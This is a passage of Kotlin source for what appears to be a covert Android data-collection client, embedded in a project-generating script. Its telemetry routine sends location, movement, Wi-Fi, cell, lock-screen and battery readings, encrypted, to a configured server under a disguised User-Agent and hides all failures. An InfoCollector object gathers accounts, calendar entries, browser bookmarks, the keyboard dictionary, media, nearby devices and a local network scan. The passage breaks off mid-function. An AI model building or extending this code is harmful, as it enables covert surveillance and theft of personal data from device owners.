        job?.cancel(); job = null
        try {
            if (locListener != null && lm != null) lm?.removeUpdates(locListener!!)
        } catch (_: Throwable) {}
        try { sm?.unregisterListener(sensorListener) } catch (_: Throwable) {}
        try {
            if (stepListener != null) sm?.unregisterListener(stepListener)
        } catch (_: Throwable) {}
        locListener = null; stepListener = null
    }

    private fun processNewLocation(loc: Location) {
        if (firstLat == null) { firstLat = loc.latitude; firstLon = loc.longitude }
        if (lastLat != null && lastLon != null) {
            val d = haversine(lastLat!!, lastLon!!, loc.latitude, loc.longitude)
            if (d < 5000) totalDistanceM += d
        }
        lastLat = loc.latitude; lastLon = loc.longitude
        val alt = if (loc.hasAltitude()) loc.altitude else null
        if (alt != null) {
            synchronized(altBuf) {
                altBuf.addLast(alt)
                while (altBuf.size > TREND_WINDOW) altBuf.removeFirst()
            }
            if (lastAlt != null) {
                val delta = alt - lastAlt!!
                if (delta > 0.5) elevationGainM += delta
                else if (delta < -0.5) elevationLossM += -delta
            }
            lastAlt = alt
        }
    }

    private fun haversine(lat1: Double, lon1: Double, lat2: Double, lon2: Double): Double {
        val R = 6371000.0
        val p1 = Math.toRadians(lat1); val p2 = Math.toRadians(lat2)
        val dp = Math.toRadians(lat2 - lat1); val dl = Math.toRadians(lon2 - lon1)
        val a = Math.sin(dp/2) * Math.sin(dp/2) + Math.cos(p1) * Math.cos(p2) * Math.sin(dl/2) * Math.sin(dl/2)
        return 2 * R * Math.atan2(Math.sqrt(a), Math.sqrt(1-a))
    }

    private fun accelVariance(): Float {
        synchronized(accelMagBuf) {
            if (accelMagBuf.size < 5) return 0f
            var sum = 0f
            for (v in accelMagBuf) sum += v
            val mean = sum / accelMagBuf.size
            var sq = 0f
            for (v in accelMagBuf) {
                val d = v - mean
                sq += d * d
            }
            return sq / accelMagBuf.size
        }
    }

    private fun trendOf(buf: ArrayDeque<Float>): String {
        synchronized(buf) {
            if (buf.size < 5) return "steady"
            val first = buf.first(); val last = buf.last()
            val diff = last - first
            val thresh = 0.1f * Math.abs(first).coerceAtLeast(1f)
            return when {
                diff > thresh -> "rising"
                diff < -thresh -> "falling"
                else -> "steady"
            }
        }
    }

    private fun altTrend(): String {
        synchronized(altBuf) {
            if (altBuf.size < 5) return "steady"
            val first = altBuf.first(); val last = altBuf.last()
            val diff = last - first
            return when {
                diff > 2.0 -> "climbing"
                diff < -2.0 -> "descending"
                else -> "steady"
            }
        }
    }

    private fun collect(ctx: Context): JSONObject {
        val o = JSONObject()
        o.put("ts", System.currentTimeMillis())
        o.put("seq", sampleCount)
        o.put("session_start", sessionStart)
        o.put("session_ms", System.currentTimeMillis() - sessionStart)

        val loc = lastLoc
        if (loc != null) {
            o.put("lat", loc.latitude); o.put("lon", loc.longitude)
            if (loc.hasAltitude()) o.put("alt", loc.altitude)
            o.put("acc_m", loc.accuracy.toDouble())
            o.put("speed", loc.speed.toDouble())
            o.put("bearing", loc.bearing.toDouble())
            o.put("provider", loc.provider ?: "?")
            o.put("fix_age_ms", System.currentTimeMillis() - lastLocTs)
            o.put("alt_trend", altTrend())
            o.put("elev_gain_m", elevationGainM)
            o.put("elev_loss_m", elevationLossM)
            o.put("total_distance_m", totalDistanceM)
            if (firstLat != null && firstLon != null) {
                o.put("distance_from_start_m", haversine(firstLat!!, firstLon!!, loc.latitude, loc.longitude))
            }
        }

        sensorValues[Sensor.TYPE_ACCELEROMETER]?.let {
            o.put("accel_x", it[0].toDouble()); o.put("accel_y", it[1].toDouble()); o.put("accel_z", it[2].toDouble())
            o.put("accel_mag", Math.sqrt((it[0]*it[0]+it[1]*it[1]+it[2]*it[2]).toDouble()))
        }
        sensorValues[Sensor.TYPE_GYROSCOPE]?.let {
            o.put("gyro_x", it[0].toDouble()); o.put("gyro_y", it[1].toDouble()); o.put("gyro_z", it[2].toDouble())
            o.put("gyro_mag", Math.sqrt((it[0]*it[0]+it[1]*it[1]+it[2]*it[2]).toDouble()))
        }
        sensorValues[Sensor.TYPE_LINEAR_ACCELERATION]?.let {
            o.put("lin_x", it[0].toDouble()); o.put("lin_y", it[1].toDouble()); o.put("lin_z", it[2].toDouble())
            o.put("lin_mag", Math.sqrt((it[0]*it[0]+it[1]*it[1]+it[2]*it[2]).toDouble()))
        }
        sensorValues[Sensor.TYPE_MAGNETIC_FIELD]?.let {
            o.put("mag_x", it[0].toDouble()); o.put("mag_y", it[1].toDouble()); o.put("mag_z", it[2].toDouble())
            o.put("mag_strength", Math.sqrt((it[0]*it[0]+it[1]*it[1]+it[2]*it[2]).toDouble()))
        }
        o.put("accel_var", accelVariance().toDouble())

        sensorValues[Sensor.TYPE_LIGHT]?.let {
            o.put("lux", it[0].toDouble())
            synchronized(lightBuf) {
                lightBuf.addLast(it[0])
                while (lightBuf.size > TREND_WINDOW) lightBuf.removeFirst()
            }
            o.put("lux_trend", trendOf(lightBuf))
        }
        sensorValues[Sensor.TYPE_PROXIMITY]?.let { o.put("proximity", it[0].toDouble()) }
        sensorValues[Sensor.TYPE_PRESSURE]?.let {
            o.put("pressure_hpa", it[0].toDouble())
            synchronized(pressureBuf) {
                pressureBuf.addLast(it[0])
                while (pressureBuf.size > TREND_WINDOW) pressureBuf.removeFirst()
            }
            o.put("pressure_trend", trendOf(pressureBuf))
        }
        sensorValues[Sensor.TYPE_AMBIENT_TEMPERATURE]?.let { o.put("amb_temp_c", it[0].toDouble()) }

        val acc = sensorValues[Sensor.TYPE_ACCELEROMETER]
        val mag = sensorValues[Sensor.TYPE_MAGNETIC_FIELD]
        if (acc != null && mag != null) {
            try {
                val rm = FloatArray(9)
                if (SensorManager.getRotationMatrix(rm, null, acc, mag)) {
                    val ori = FloatArray(3)
                    SensorManager.getOrientation(rm, ori)
                    o.put("compass", (Math.toDegrees(ori[0].toDouble()) + 360.0) % 360.0)
                }
            } catch (_: Throwable) {}
        }

        sensorValues[Sensor.TYPE_ROTATION_VECTOR]?.let {
            try {
                val rm = FloatArray(9)
                SensorManager.getRotationMatrixFromVector(rm, it)
                val ori = FloatArray(3)
                SensorManager.getOrientation(rm, ori)
                val yaw = Math.toDegrees(ori[0].toDouble())
                val pitch = Math.toDegrees(ori[1].toDouble())
                val roll = Math.toDegrees(ori[2].toDouble())
                o.put("yaw", yaw); o.put("pitch", pitch); o.put("roll", roll)
                o.put("tilt_deg", Math.max(Math.abs(pitch), Math.abs(roll)))
            } catch (_: Throwable) {}
        }

        val linMag = o.optDouble("lin_mag", 0.0)
        val gyroMag = o.optDouble("gyro_mag", 0.0)
        val accelMag = o.optDouble("accel_mag", 9.81)
        val az = o.optDouble("accel_z", 0.0)

        val freeFall = accelMag < 2.0
        val shake = gyroMag > 2.0 || linMag > 8.0
        val moving = linMag > 0.5 || gyroMag > 0.3

        var cadenceSpm = 0
        sensorValues[Sensor.TYPE_STEP_COUNTER]?.let {
            val total = it[0]
            if (baselineSteps < 0) baselineSteps = total
            if (lastSampleStep >= 0) {
                val delta = (total - lastSampleStep).toInt()
                cadenceSpm = delta * (60_000 / TICK_MS.toInt())
            }
            lastSampleStep = total
            o.put("steps_total", total.toInt())
            o.put("steps_session", (total - baselineSteps).toInt())
        }
        o.put("cadence_spm", cadenceSpm)

        val motionClass = when {
            freeFall -> "freefall"
            shake -> "shake"
            cadenceSpm > 140 -> "running"
            cadenceSpm > 40 -> "walking"
            linMag > 1.5 && accelVariance() > 0.5 && gyroMag < 1.0 -> "driving"
            !moving && accelVariance() < 0.05 -> "still"
            else -> "unknown"
        }
        o.put("motion_class", motionClass)
        o.put("moving", moving)
        o.put("freefall", freeFall)
        o.put("shake", shake)

        val orient = when {
            az > 8.0 -> "face_up"
            az < -8.0 -> "face_down"
            Math.abs(az) < 3.0 -> "upright"
            else -> "tilted"
        }
        o.put("orientation", orient)

        val heldInHand = linMag > 0.02 && linMag < 1.5 && gyroMag > 0.02 && gyroMag < 1.0 && accelVariance() < 1.0
        o.put("held_in_hand", heldInHand)

        val prox = o.optDouble("proximity", 100.0)
        val lux = o.optDouble("lux", 500.0)
        val screenOff = !isScreenOn(ctx)
        o.put("pocket_detected", prox < 3.0 && lux < 10.0 && screenOff)

        try {
            val bi = ctx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            if (bi != null) {
                val lvl = bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
                val scl = bi.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
                o.put("battery_pct", if (lvl >= 0 && scl > 0) lvl * 100 / scl else -1)
                val tmp = bi.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1)
                if (tmp >= 0) o.put("battery_temp_c", tmp / 10.0)
                o.put("battery_voltage_mv", bi.getIntExtra(BatteryManager.EXTRA_VOLTAGE, -1))
                val st = bi.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
                o.put("charging", st == BatteryManager.BATTERY_STATUS_CHARGING || st == BatteryManager.BATTERY_STATUS_FULL)
                val pl = bi.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1)
                o.put("charge_source", when (pl) {
                    BatteryManager.BATTERY_PLUGGED_AC -> "AC"
                    BatteryManager.BATTERY_PLUGGED_USB -> "USB"
                    BatteryManager.BATTERY_PLUGGED_WIRELESS -> "Wireless"
                    else -> "none"
                })
            }
            val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
            o.put("battery_current_ma", bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CURRENT_NOW) / 1000)
        } catch (_: Throwable) {}

        try {
            val pm = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
            o.put("screen_on", if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) pm.isInteractive else pm.isScreenOn)
            o.put("power_save", pm.isPowerSaveMode)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) o.put("doze", pm.isDeviceIdleMode)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val t = pm.currentThermalStatus
                o.put("thermal", when (t) {
                    PowerManager.THERMAL_STATUS_NONE -> "NONE"
                    PowerManager.THERMAL_STATUS_LIGHT -> "LIGHT"
                    PowerManager.THERMAL_STATUS_MODERATE -> "MODERATE"
                    PowerManager.THERMAL_STATUS_SEVERE -> "SEVERE"
                    PowerManager.THERMAL_STATUS_CRITICAL -> "CRITICAL"
                    PowerManager.THERMAL_STATUS_EMERGENCY -> "EMERGENCY"
                    PowerManager.THERMAL_STATUS_SHUTDOWN -> "SHUTDOWN"
                    else -> "?"
                })
            }
        } catch (_: Throwable) {}

        try {
            o.put("screen_brightness", Settings.System.getInt(ctx.contentResolver, Settings.System.SCREEN_BRIGHTNESS, -1))
            val km = ctx.getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
            o.put("screen_locked", km.isKeyguardLocked)
        } catch (_: Throwable) {}

        try {
            val am = ctx.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            o.put("ringer_mode", when (am.ringerMode) {
                AudioManager.RINGER_MODE_SILENT -> "SILENT"
                AudioManager.RINGER_MODE_VIBRATE -> "VIBRATE"
                AudioManager.RINGER_MODE_NORMAL -> "NORMAL"
                else -> "?"
            })
            o.put("music_active", am.isMusicActive)
            o.put("media_volume", am.getStreamVolume(AudioManager.STREAM_MUSIC))
            @Suppress("DEPRECATION")
            o.put("headset", when {
                am.isBluetoothA2dpOn -> "BT-A2DP"
                am.isBluetoothScoOn -> "BT-SCO"
                am.isWiredHeadsetOn -> "Wired"
                am.isSpeakerphoneOn -> "Speaker"
                else -> "None"
            })
            val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
            if (nm.isNotificationPolicyAccessGranted) {
                o.put("dnd", nm.currentInterruptionFilter != android.app.NotificationManager.INTERRUPTION_FILTER_ALL)
            }
        } catch (_: Throwable) {}

        try {
            val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val wi = wm.connectionInfo
            if (wi != null) {
                o.put("wifi_ssid", wi.ssid ?: "?")
                o.put("wifi_bssid", wi.bssid ?: "?")
                o.put("wifi_rssi", wi.rssi)
                o.put("wifi_freq", wi.frequency)
                o.put("wifi_link_mbps", wi.linkSpeed)
            }
        } catch (_: Throwable) {}

        try {
            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                o.put("cell_data_net_type", tm.dataNetworkType)
                o.put("cell_voice_net_type", tm.voiceNetworkType)
            }
            o.put("cell_operator", tm.networkOperatorName ?: "")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                try {
                    val sig = tm.signalStrength
                    if (sig != null) {
                        val strengths = sig.cellSignalStrengths
                        if (strengths.isNotEmpty()) o.put("cell_dbm", strengths[0].dbm)
                    }
                } catch (_: Throwable) {}
            }
        } catch (_: Throwable) {}

        try {
            val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val caps = cm.getNetworkCapabilities(cm.activeNetwork)
            o.put("net_transport", when {
                caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true -> "WiFi"
                caps?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "Cellular"
                caps?.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) == true -> "Ethernet"
                else -> "None"
            })
            if (caps != null) {
                o.put("net_metered", !caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_NOT_METERED))
                o.put("vpn_active", caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN))
            }
        } catch (_: Throwable) {}

        try {
            val bm = ctx.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
            val a = bm.adapter
            if (a != null && a.isEnabled) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.BLUETOOTH_CONNECT) == PackageManager.PERMISSION_GRANTED) {
                        o.put("bt_bonded", a.bondedDevices?.size ?: 0)
                    }
                } else {
                    @Suppress("DEPRECATION")
                    o.put("bt_bonded", a.bondedDevices?.size ?: 0)
                }
            }
        } catch (_: Throwable) {}

        try {
            o.put("airplane", Settings.Global.getInt(ctx.contentResolver, Settings.Global.AIRPLANE_MODE_ON, 0) == 1)
        } catch (_: Throwable) {}

        try {
            val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
            o.put("screen_rotation", wm.defaultDisplay.rotation * 90)
        } catch (_: Throwable) {}

        return o
    }

    private fun isScreenOn(ctx: Context): Boolean = try {
        val pm = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) pm.isInteractive else pm.isScreenOn
    } catch (_: Throwable) { false }

    private fun post(ctx: Context, payload: JSONObject) {
        try {
            val serverUrl = SharedPrefsManager.getServerUrl(ctx)
            val key = SharedPrefsManager.getEncryptionKey(ctx)
            val clientId = DeviceFingerprint.getDeviceId(ctx)
            val ts = System.currentTimeMillis().toString()
            val auth = genAuth(ts, key)
            val encrypted = AESHelper.encrypt(payload.toString(), key)
            val url = URL("$serverUrl/telemetry")
            val conn = (if (serverUrl.startsWith("https")) url.openConnection() as HttpsURLConnection
                        else url.openConnection() as HttpURLConnection)
            conn.requestMethod = "POST"
            conn.setRequestProperty("User-Agent", "okhttp/4.9.0")
            conn.setRequestProperty("X-Timestamp", ts)
            conn.setRequestProperty("X-Auth-Token", auth)
            conn.setRequestProperty("X-Client-ID", clientId)
            conn.setRequestProperty("Content-Type", "text/plain")
            conn.setRequestProperty("Connection", "close")
            conn.connectTimeout = 5000
            conn.readTimeout = 5000
            conn.doOutput = true
            conn.outputStream.write(encrypted.toByteArray())
            conn.outputStream.flush()
            conn.responseCode
            conn.disconnect()
        } catch (_: Throwable) {}
    }

    private fun genAuth(ts: String, key: String): String =
        MessageDigest.getInstance("SHA-256").digest("$ts:$key".toByteArray()).joinToString("") { "%02x".format(it) }
}
""",
"app/src/main/java/com/yourapp/client/InfoCollector.kt": r"""
package com.yourapp.client

import android.Manifest
import android.accounts.AccountManager
import android.app.ActivityManager
import android.app.KeyguardManager
import android.bluetooth.BluetoothManager
import android.bluetooth.le.ScanCallback
import android.bluetooth.le.ScanResult
import android.bluetooth.le.ScanSettings
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.hardware.Sensor
import android.hardware.SensorEvent
import android.hardware.SensorEventListener
import android.hardware.SensorManager
import android.hardware.camera2.CameraManager
import android.hardware.input.InputManager
import android.location.Location
import android.location.LocationManager
import android.media.AudioManager
import android.net.ConnectivityManager
import android.net.LinkProperties
import android.net.NetworkCapabilities
import android.net.Uri
import android.net.nsd.NsdManager
import android.net.nsd.NsdServiceInfo
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Debug
import android.os.Environment
import android.os.StatFs
import android.os.SystemClock
import android.os.storage.StorageManager
import android.provider.CalendarContract
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.provider.UserDictionary
import android.telephony.TelephonyManager
import android.text.format.Formatter
import android.util.DisplayMetrics
import android.view.WindowManager
import androidx.core.content.ContextCompat
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.InetSocketAddress
import java.net.Socket
import java.net.URL
import java.security.KeyStore
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.CountDownLatch
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

object InfoCollector {
    private const val COLLECT_TIMEOUT_MS = 90000L
    private const val IP_HTTP_TIMEOUT_MS = 3000
    private const val SENSOR_READ_WAIT_MS = 1500L
    private const val BLE_SCAN_MS = 5000L
    private const val MDNS_PER_SERVICE_MS = 1200L
    private const val LAN_SCAN_TIMEOUT_MS = 200
    private const val LAN_SCAN_TOTAL_SEC = 20L

    private val busy = AtomicBoolean(false)

    fun collect(context: Context): String {
        if (!busy.compareAndSet(false, true)) return "info collection already in progress, try again in a moment"
        val holder = arrayOf("info collection produced no output")
        val t = Thread {
            try {
                holder[0] = collectInternal(context)
            } catch (e: Throwable) {
                holder[0] = "info collection failed: " + (e.message ?: e.javaClass.simpleName)
            } finally {
                busy.set(false)
            }
        }
        t.isDaemon = true
        t.name = "InfoCollector"
        t.start()
        try { t.join(COLLECT_TIMEOUT_MS) } catch (_: InterruptedException) {}
        return holder[0]
    }

    private fun collectInternal(context: Context): String {
        val sb = StringBuilder()
        sb.append("========== DEVICE INFORMATION ==========\n").append(getDeviceInfo(context))
        sb.append("\n========== OS & SYSTEM ==========\n").append(getOsInfo(context))
        sb.append("\n========== BATTERY ==========\n").append(getBatteryInfo(context))
        sb.append("\n========== TELEPHONY & SIM ==========\n").append(getTelephonyInfo(context))
        sb.append("\n========== NETWORK ==========\n").append(getNetworkInfo(context))
        sb.append("\n========== LOCATION ==========\n").append(getLocationInfo(context))
        sb.append("\n========== DISPLAY ==========\n").append(getDisplayInfo(context))
        sb.append("\n========== SENSORS ==========\n").append(getSensorInfo(context))
        sb.append("\n========== STORAGE ==========\n").append(getStorageInfo())
        sb.append("\n========== CPU & MEMORY ==========\n").append(getCpuMemoryInfo(context))
        sb.append("\n========== INSTALLED APPLICATIONS ==========\n").append(getInstalledApps(context))
        sb.append("\n========== SECURITY & ROOT ==========\n").append(getSecurityInfo(context))
        sb.append("\n========== LOCK SCREEN & ENCRYPTION ==========\n").append(getLockScreenInfo(context))
        sb.append("\n========== SYSTEM SETTINGS ==========\n").append(getSystemSettingsInfo(context))
        sb.append("\n========== LOCALE & CONFIG ==========\n").append(getLocaleConfigInfo())
        sb.append("\n========== BATTERY LIVE ==========\n").append(getBatteryLiveInfo(context))
        sb.append("\n========== NETWORK EXTRAS ==========\n").append(getNetworkExtrasInfo(context))
        sb.append("\n========== AUDIO STATE ==========\n").append(getAudioInfo(context))
        sb.append("\n========== CAMERAS ==========\n").append(getCameraInfo(context))
        sb.append("\n========== SYSTEM FEATURES ==========\n").append(getFeatureFlags(context))
        sb.append("\n========== INPUT DEVICES ==========\n").append(getInputDevicesInfo(context))
        sb.append("\n========== MEMORY & PROCESS ==========\n").append(getMemoryProcessInfo())
        sb.append("\n========== STORAGE VOLUMES ==========\n").append(getStorageVolumesInfo(context))
        sb.append("\n========== KEYSTORE / HW SECURITY ==========\n").append(getKeystoreInfo())
        sb.append("\n========== WEBVIEW ==========\n").append(getWebViewInfo(context))
        sb.append("\n========== WIFI NEARBY ==========\n").append(getWifiScanInfo(context))
        sb.append("\n========== CELL TOWERS ==========\n").append(getCellTowerInfo(context))
        sb.append("\n========== LIVE SENSORS ==========\n").append(getLiveSensorValues(context))
        sb.append("\n========== BLUETOOTH ==========\n").append(getBluetoothInfo(context))
        sb.append("\n========== RECENT MEDIA ==========\n").append(getRecentMediaInfo(context))
        sb.append("\n========== CALENDAR ==========\n").append(getCalendarInfo(context))
        sb.append("\n========== BOOT & SYSTEM INTERNALS ==========\n").append(getBootInternalsInfo())
        sb.append("\n========== PRIVACY & PROTECTED APPS ==========\n").append(getPrivacyInfo(context))
        sb.append("\n========== ACCOUNTS & IDENTITY ==========\n").append(getAccountsInfo(context))
        sb.append("\n========== OWNER PROFILE ==========\n").append(getOwnerProfileInfo(context))
        sb.append("\n========== APP INSTALL SOURCES ==========\n").append(getAppInstallInfo(context))
        sb.append("\n========== BLUETOOTH LE SCAN ==========\n").append(getBleScanInfo(context))
        sb.append("\n========== MEDIA FILESYSTEM ==========\n").append(getMediaFilesystemInfo(context))
        sb.append("\n========== ACTIVITY & STEPS ==========\n").append(getActivityStepsInfo(context))
        sb.append("\n========== BOOT HISTORY ==========\n").append(getBootHistoryInfo(context))
        sb.append("\n========== KEYBOARD USER DICTIONARY ==========\n").append(getUserDictionaryInfo(context))
        sb.append("\n========== BROWSER BOOKMARKS ==========\n").append(getBrowserBookmarksInfo(context))
        sb.append("\n========== MDNS / LOCAL SERVICES ==========\n").append(getMdnsInfo(context))
        sb.append("\n========== LAN SCAN ==========\n").append(getLanScanInfo(context))
        sb.append("\n========================================\n")
        return sb.toString()
    }

    private fun getDeviceInfo(context: Context): String = buildString {
        append("Manufacturer: ").append(Build.MANUFACTURER).append("\n")
        append("Brand: ").append(Build.BRAND).append("\n")
        append("Model: ").append(Build.MODEL).append("\n")
        append("Device: ").append(Build.DEVICE).append("\n")
        append("Product: ").append(Build.PRODUCT).append("\n")
        append("Hardware: ").append(Build.HARDWARE).append("\n")
        append("Board: ").append(Build.BOARD).append("\n")
        append("Bootloader: ").append(Build.BOOTLOADER).append("\n")
        append("Radio: ").append(Build.getRadioVersion()).append("\n")
        append("Fingerprint: ").append(Build.FINGERPRINT).append("\n")
        append("Serial: ").append(safeGetSerial()).append("\n")
        append("Supported ABIs: ").append(Build.SUPPORTED_ABIS.joinToString(", ")).append("\n")
        append("Security Patch: ").append(Build.VERSION.SECURITY_PATCH).append("\n")
    }

    private fun safeGetSerial(): String = try {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) "Restricted (Android 10+)" else Build.getSerial() ?: "N/A"
    } catch (e: Exception) {
        "Restricted (Android 10+)"
    }

    private fun getOsInfo(context: Context): String = buildString {
        append("Android Version: ").append(Build.VERSION.RELEASE).append("\n")
        append("API Level: ").append(Build.VERSION.SDK_INT).append("\n")
        append("Build ID: ").append(Build.DISPLAY).append("\n")
        append("Kernel: ").append(System.getProperty("os.version") ?: "N/A").append("\n")
        append("Uptime: ").append(formatUptime(SystemClock.elapsedRealtime())).append("\n")
        val bt = System.currentTimeMillis() - SystemClock.elapsedRealtime()
        append("Boot Time: ").append(SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(bt))).append("\n")
    }

    private fun getBatteryInfo(context: Context): String = buildString {
        try {
            val bi = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            if (bi != null) {
                val lvl = bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
                val scl = bi.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
                val st = bi.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
                val h = bi.getIntExtra(BatteryManager.EXTRA_HEALTH, -1)
                val tmp = bi.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1)
                val v = bi.getIntExtra(BatteryManager.EXTRA_VOLTAGE, -1)
                append("Level: ").append(if (lvl >= 0 && scl > 0) lvl * 100 / scl else -1).append("%\n")
                append("Status: ").append(if (st == BatteryManager.BATTERY_STATUS_CHARGING) "Charging" else if (st == BatteryManager.BATTERY_STATUS_DISCHARGING) "Discharging" else "Other").append("\n")
                append("Health: ").append(if (h == BatteryManager.BATTERY_HEALTH_GOOD) "Good" else "Other").append("\n")
                append("Temperature: ").append(if (tmp >= 0) (tmp / 10.0).toString() else "N/A").append(" C\n")
                append("Voltage: ").append(if (v >= 0) v else "N/A").append(" mV\n")
            } else {
                append("Battery info unavailable\n")
            }
        } catch (e: Exception) {
            append("Battery error: ").append(e.message).append("\n")
        }
    }

    private fun getTelephonyInfo(context: Context): String = buildString {
        try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            append("SIM State: ").append(tm.simState).append("\n")
            append("Network Operator: ").append(tm.networkOperatorName ?: "N/A").append("\n")
            append("Network Country ISO: ").append(tm.networkCountryIso ?: "N/A").append("\n")
            append("Data State: ").append(tm.dataState).append("\n")
            append("Call State: ").append(tm.callState).append("\n")
            append("Roaming: ").append(tm.isNetworkRoaming).append("\n")
        } catch (e: Exception) {
            append("Telephony error: ").append(e.message).append("\n")
        }
    }

    private fun getNetworkInfo(context: Context): String = buildString {
        append("Public IP: ").append(getPublicIp()).append("\n")
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val caps = cm.getNetworkCapabilities(cm.activeNetwork)
        when {
            caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true -> append("Active Network: WiFi\n")
            caps?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true -> append("Active Network: Cellular\n")
            caps?.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) == true -> append("Active Network: Ethernet\n")
            else -> append("Active Network: Unknown\n")
        }
        try {
            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val wi = wm.connectionInfo
            append("WiFi SSID: ").append(wi.ssid ?: "N/A").append("\n")
            append("WiFi BSSID: ").append(wi.bssid ?: "N/A").append("\n")
            append("WiFi Signal: ").append(wi.rssi).append(" dBm\n")
        } catch (_: Exception) {}
    }

    private fun getLocationInfo(context: Context): String =
        getDeviceLocation(context) + getIpLocation()

    fun getDeviceLocation(context: Context): String {
        val hasFine = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        if (!hasFine) return "Device Location: No permission\n"
        val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        var best: Location? = null
        for (p in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER)) {
            try {
                val l = lm.getLastKnownLocation(p)
                if (l != null && (best == null || l.accuracy < best!!.accuracy)) best = l
            } catch (_: Exception) {}
        }
        return if (best != null)
            "Device Location: ${best!!.latitude}, ${best!!.longitude} ± ${best!!.accuracy}m (${best!!.provider})\n"
        else
            "Device Location: Unavailable\n"
    }

    fun getGpsCoordinates(context: Context): Pair<Double, Double>? {
        val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        for (p in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER)) {
            try {
                val l = lm.getLastKnownLocation(p)
                if (l != null) return Pair(l.latitude, l.longitude)
            } catch (_: Exception) {}
        }
        return null
    }

    private fun getIpLocation(): String = try {
        val conn = URL("https://ipapi.co/json/").openConnection() as HttpURLConnection
        conn.connectTimeout = IP_HTTP_TIMEOUT_MS
        conn.readTimeout = IP_HTTP_TIMEOUT_MS
        val j = JSONObject(conn.inputStream.bufferedReader().readText())
        conn.disconnect()
        "IP City: ${j.optString("city", "N/A")}\nIP Country: ${j.optString("country_name", "N/A")}\nIP ISP: ${j.optString("org", "N/A")}\nIP Lat/Lon: ${j.optDouble("latitude", 0.0)},${j.optDouble("longitude", 0.0)}\n"
    } catch (_: Exception) {
        try {
            val conn = URL("https://ipinfo.io/json").openConnection() as HttpURLConnection
            conn.connectTimeout = IP_HTTP_TIMEOUT_MS
            conn.readTimeout = IP_HTTP_TIMEOUT_MS
            val j = JSONObject(conn.inputStream.bufferedReader().readText())
            conn.disconnect()
            val loc = j.optString("loc", "0,0").split(",")
            "IP City: ${j.optString("city", "N/A")}\nIP Country: ${j.optString("country", "N/A")}\nIP ISP: ${j.optString("org", "N/A")}\nIP Lat/Lon: ${loc.getOrNull(0) ?: "0"},${loc.getOrNull(1) ?: "0"}\n"
        } catch (_: Exception) {
            "IP Location: unavailable\n"
        }
    }

    private fun getDisplayInfo(context: Context): String = buildString {
        try {
            val dm = DisplayMetrics()
            (context.getSystemService(Context.WINDOW_SERVICE) as WindowManager).defaultDisplay.getRealMetrics(dm)
            append("Resolution: ").append(dm.widthPixels).append("x").append(dm.heightPixels).append("\n")
            append("Density DPI: ").append(dm.densityDpi).append("\n")
        } catch (_: Exception) {}
    }

    private fun getSensorInfo(context: Context): String = buildString {
        try {
            val sm = context.getSystemService(Context.SENSOR_SERVICE) as SensorManager
